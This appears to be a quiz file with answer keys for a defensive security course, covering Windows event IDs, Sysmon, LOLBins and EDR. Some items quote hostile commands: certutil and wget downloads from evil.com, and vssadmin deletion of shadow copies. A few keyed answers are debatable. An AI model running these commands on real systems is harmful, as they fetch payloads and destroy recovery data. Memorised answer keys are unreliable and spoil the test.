@@ -1,0 +1,364 @@
+{
+    "id": "quiz_ch_4",
+    "chapterId": "ch_4",
+    "title": "Chapter 4 Mastery Quiz",
+    "description": "Test your knowledge of Windows Event Logs, Sysmon, process analysis, and EDR fundamentals.",
+    "passingScore": 70,
+    "xpReward": 50,
+    "questions": [
+        {
+            "id": "q1",
+            "type": "mcq",
+            "question": "Which Windows Event ID indicates a successful user logon?",
+            "options": [
+                "4625",
+                "4624",
+                "4688",
+                "5156"
+            ],
+            "correctAnswer": 1,
+            "explanation": "4624 is successful logon. 4625 is failed logon. 4688 is process creation."
+        },
+        {
+            "id": "q2",
+            "type": "true_false",
+            "question": "Event ID 4688 in Windows Security Log contains the full command line of the process executed.",
+            "correctAnswer": true,
+            "explanation": "True. When command line auditing is enabled, Event 4688 includes the 'Process Command Line' field."
+        },
+        {
+            "id": "q3",
+            "type": "fill_blank",
+            "question": "Logon Type _____ indicates an interactive logon via RDP (Remote Desktop Protocol).",
+            "options": [
+                "2",
+                "3",
+                "10",
+                "5"
+            ],
+            "correctAnswer": "10",
+            "explanation": "Logon Type 10 is RemoteInteractive. Type 2 is local console. Type 3 is network."
+        },
+        {
+            "id": "q4",
+            "type": "mcq",
+            "question": "You see a process tree: `winword.exe` -> `cmd.exe` -> `powershell.exe`. Why is this highly suspicious?",
+            "options": [
+                "Microsoft Word should never spawn command shells or scripting engines.",
+                "PowerShell is not installed by default.",
+                "Word cannot open documents.",
+                "It is a normal macro operation."
+            ],
+            "correctAnswer": 0,
+            "explanation": "This is the classic signature of a malicious Office macro dropper."
+        },
+        {
+            "id": "q5",
+            "type": "mcq",
+            "question": "What is a 'LOLBin'?",
+            "options": [
+                "A type of malware.",
+                "A legitimate, signed Microsoft binary used maliciously by attackers (e.g., rundll32.exe, certutil.exe).",
+                "A Linux log file.",
+                "A firewall rule."
+            ],
+            "correctAnswer": 1,
+            "explanation": "Living Off the Land Binaries are trusted tools abused to evade detection."
+        },
+        {
+            "id": "q6",
+            "type": "mcq",
+            "question": "Which PowerShell command flag is a strong indicator of obfuscated malicious code?",
+            "options": [
+                "-Help",
+                "-ExecutionPolicy Bypass",
+                "-EncodedCommand",
+                "-WhatIf"
+            ],
+            "correctAnswer": 2,
+            "explanation": "`-Enc` or `-EncodedCommand` accepts Base64-encoded scripts to hide the true intent."
+        },
+        {
+            "id": "q7",
+            "type": "mcq",
+            "question": "In Linux, which file would you check to see which user successfully used 'sudo' to run a command as root?",
+            "options": [
+                "/var/log/syslog",
+                "/var/log/auth.log",
+                "/var/log/apache2/access.log",
+                "~/.bashrc"
+            ],
+            "correctAnswer": 1,
+            "explanation": "`auth.log` (or `secure`) tracks authentication and privilege escalation events."
+        },
+        {
+            "id": "q8",
+            "type": "true_false",
+            "question": "An attacker typing 'history -c' in a Linux terminal is a strong indicator of malicious intent.",
+            "correctAnswer": true,
+            "explanation": "True. Clearing command history is a deliberate attempt to hide tracks and is highly suspicious."
+        },
+        {
+            "id": "q9",
+            "type": "mcq",
+            "question": "Which Sysmon Event ID provides the SHA256 hash of a newly created process?",
+            "options": [
+                "Event ID 3",
+                "Event ID 1",
+                "Event ID 8",
+                "Event ID 11"
+            ],
+            "correctAnswer": 1,
+            "explanation": "Sysmon Event ID 1 (Process Create) includes file hashes for identification."
+        },
+        {
+            "id": "q10",
+            "type": "mcq",
+            "question": "What specific attack technique does Sysmon Event ID 8 (CreateRemoteThread) detect?",
+            "options": [
+                "File Deletion",
+                "Process Injection",
+                "DNS Query",
+                "Service Installation"
+            ],
+            "correctAnswer": 1,
+            "explanation": "CreateRemoteThread is a common Windows API used for injecting code into another process."
+        },
+        {
+            "id": "q11",
+            "type": "fill_blank",
+            "question": "The Windows command `vssadmin delete shadows /all` is often used by _____ to prevent file recovery.",
+            "options": [
+                "Print Spooler",
+                "Ransomware",
+                "Windows Update",
+                "Disk Cleanup"
+            ],
+            "correctAnswer": "Ransomware",
+            "explanation": "Ransomware deletes Volume Shadow Copies to prevent victims from restoring files without paying."
+        },
+        {
+            "id": "q12",
+            "type": "mcq",
+            "question": "What is the primary benefit of an EDR solution over traditional Antivirus?",
+            "options": [
+                "EDR provides continuous visibility, behavioral detection, and remote response capabilities.",
+                "EDR uses smaller signature files.",
+                "EDR is free with Windows.",
+                "EDR does not require updates."
+            ],
+            "correctAnswer": 0,
+            "explanation": "EDR focuses on behavior and response, not just known-bad file signatures."
+        },
+        {
+            "id": "q13",
+            "type": "mcq",
+            "question": "An attacker uses `certutil.exe -urlcache -split -f http://evil.com/payload.exe`. What are they doing?",
+            "options": [
+                "Checking a certificate revocation list.",
+                "Downloading a malicious file using a trusted Windows binary.",
+                "Encrypting a file.",
+                "Viewing a website."
+            ],
+            "correctAnswer": 1,
+            "explanation": "`certutil` can be abused as a download cradle. This is a classic LOLBin technique."
+        },
+        {
+            "id": "q14",
+            "type": "mcq",
+            "question": "According to the Pyramid of Pain, which type of indicator is HARDEST for an attacker to change?",
+            "options": [
+                "IP Addresses",
+                "Domain Names",
+                "File Hashes",
+                "Tactics, Techniques, and Procedures (TTPs)"
+            ],
+            "correctAnswer": 3,
+            "explanation": "TTPs represent behavior and methodology, which require the attacker to re-tool and re-learn."
+        },
+        {
+            "id": "q15",
+            "type": "true_false",
+            "question": "Sysmon automatically alerts the SOC when it detects suspicious activity.",
+            "correctAnswer": false,
+            "explanation": "False. Sysmon is a sensor/driver. It writes logs. You need a SIEM or separate detection rules to generate alerts from those logs."
+        },
+        {
+            "id": "q16",
+            "type": "mcq",
+            "question": "Which Windows Event ID indicates a new service was installed?",
+            "options": [
+                "4624",
+                "4688",
+                "4697",
+                "7045"
+            ],
+            "correctAnswer": 2,
+            "explanation": "Event ID 4697 (Security Log) or 7045 (System Log) indicates service installation, a common persistence mechanism."
+        },
+        {
+            "id": "q17",
+            "type": "mcq",
+            "question": "In a modern EDR console, what does the 'Isolate Host' button typically do?",
+            "options": [
+                "Shut down the computer.",
+                "Block all network traffic to/from that specific endpoint, except to the EDR cloud console.",
+                "Uninstall the malware.",
+                "Take a screenshot."
+            ],
+            "correctAnswer": 1,
+            "explanation": "Network isolation contains the threat while allowing the analyst to continue remote investigation via the EDR agent."
+        },
+        {
+            "id": "q18",
+            "type": "fill_blank",
+            "question": "A Windows process that is launched without a parent process or with a suspicious parent is called an _____.",
+            "options": [
+                "Orphan",
+                "Zombie",
+                "Anomaly",
+                "Injection Target"
+            ],
+            "correctAnswer": "Anomaly",
+            "explanation": "Parent-child relationship anomalies are strong behavioral indicators of malicious activity."
+        },
+        {
+            "id": "q19",
+            "type": "mcq",
+            "question": "Which of the following is NOT a typical capability of an EDR platform?",
+            "options": [
+                "Real-time process monitoring",
+                "Blocking malicious IPs at the network perimeter firewall",
+                "Remote shell access for investigation",
+                "File integrity monitoring"
+            ],
+            "correctAnswer": 1,
+            "explanation": "Blocking at the perimeter is a firewall/network function. EDR focuses on the endpoint itself."
+        },
+        {
+            "id": "q20",
+            "type": "true_false",
+            "question": "A log entry showing 'Event ID 4625' followed immediately by 'Event ID 4624' from the same source IP likely indicates a successful credential stuffing or brute-force attack.",
+            "correctAnswer": true,
+            "explanation": "True. Multiple failures (4625) followed by a success (4624) is the classic signature of a successful password guessing attack."
+        },
+        {
+            "id": "q21",
+            "type": "mcq",
+            "question": "What does the Linux command 'wget http://evil.com/script.sh -O /tmp/update.sh' do?",
+            "options": [
+                "Uploads a file to evil.com.",
+                "Downloads a file from evil.com and saves it to /tmp.",
+                "Executes a script.",
+                "Deletes the /tmp folder."
+            ],
+            "correctAnswer": 1,
+            "explanation": "`wget` is a command-line download utility. The `-O` flag specifies the output filename."
+        },
+        {
+            "id": "q22",
+            "type": "mcq",
+            "question": "Which of these is an example of 'Living off the Land' (LotL)?",
+            "options": [
+                "Dropping a custom EXE file named 'malware.exe'.",
+                "Using Windows built-in 'PowerShell' to download and execute a script.",
+                "Sending a phishing email.",
+                "Exploiting a buffer overflow."
+            ],
+            "correctAnswer": 1,
+            "explanation": "LotL leverages trusted, native OS tools to avoid detection."
+        },
+        {
+            "id": "q23",
+            "type": "fill_blank",
+            "question": "In Windows Event Logs, a logon with Logon Type 3 indicates a _____ logon, often seen when accessing a shared folder.",
+            "options": [
+                "Interactive",
+                "Network",
+                "Service",
+                "RemoteInteractive"
+            ],
+            "correctAnswer": "Network",
+            "explanation": "Type 3 is Network logon (e.g., SMB share access)."
+        },
+        {
+            "id": "q24",
+            "type": "mcq",
+            "question": "Why is it important to have a well-tuned Sysmon configuration?",
+            "options": [
+                "To reduce noise and log volume, ensuring critical events aren't missed.",
+                "To make the computer run faster.",
+                "Sysmon does not require configuration.",
+                "To replace antivirus."
+            ],
+            "correctAnswer": 0,
+            "explanation": "Logging everything creates massive data overhead and can hide true positives in a sea of false positives."
+        },
+        {
+            "id": "q25",
+            "type": "true_false",
+            "question": "A process named `svchost.exe` running under the user account 'jsmith' (instead of SYSTEM, NETWORK SERVICE, or LOCAL SERVICE) is normal Windows behavior.",
+            "correctAnswer": false,
+            "explanation": "False. `svchost.exe` should almost always run under SYSTEM or service accounts. Running as a regular user is a strong indicator of malware."
+        },
+        {
+            "id": "q26",
+            "type": "mcq",
+            "question": "You are investigating a suspected ransomware incident. Which command line evidence is most damning?",
+            "options": [
+                "ipconfig /all",
+                "net user",
+                "vssadmin delete shadows /all /quiet",
+                "ping google.com"
+            ],
+            "correctAnswer": 2,
+            "explanation": "Deleting Volume Shadow Copies is a deliberate pre-encryption step unique to human-operated ransomware."
+        },
+        {
+            "id": "q27",
+            "type": "mcq",
+            "question": "Which of the following BEST describes Sysmon Event ID 3?",
+            "options": [
+                "Process Creation",
+                "Network Connection",
+                "File Creation Time",
+                "Driver Loaded"
+            ],
+            "correctAnswer": 1,
+            "explanation": "Event ID 3 logs TCP/UDP network connections initiated by processes."
+        },
+        {
+            "id": "q28",
+            "type": "fill_blank",
+            "question": "The technique where malware creates a legitimate process in a suspended state, then replaces its memory with malicious code, is called Process _____.",
+            "options": [
+                "Hollowing",
+                "Dumping",
+                "Cracking",
+                "Spawning"
+            ],
+            "correctAnswer": "Hollowing",
+            "explanation": "Process Hollowing is a common evasion technique."
+        },
+        {
+            "id": "q29",
+            "type": "mcq",
+            "question": "In a Linux environment, what is the primary value of centralizing logs to a SIEM?",
+            "options": [
+                "It saves disk space.",
+                "It prevents attackers from deleting local log files to cover their tracks.",
+                "It speeds up the boot process.",
+                "It allows for graphical log viewing."
+            ],
+            "correctAnswer": 1,
+            "explanation": "Centralization ensures evidence is preserved even if the compromised endpoint is wiped."
+        },
+        {
+            "id": "q30",
+            "type": "true_false",
+            "question": "Event ID 4648 indicates a user logged on using explicit credentials (e.g., RunAs different user) and is a key indicator of lateral movement.",
+            "correctAnswer": true,
+            "explanation": "True. 4648 shows one account starting a process under the context of another account."
+        }
+    ]
+}
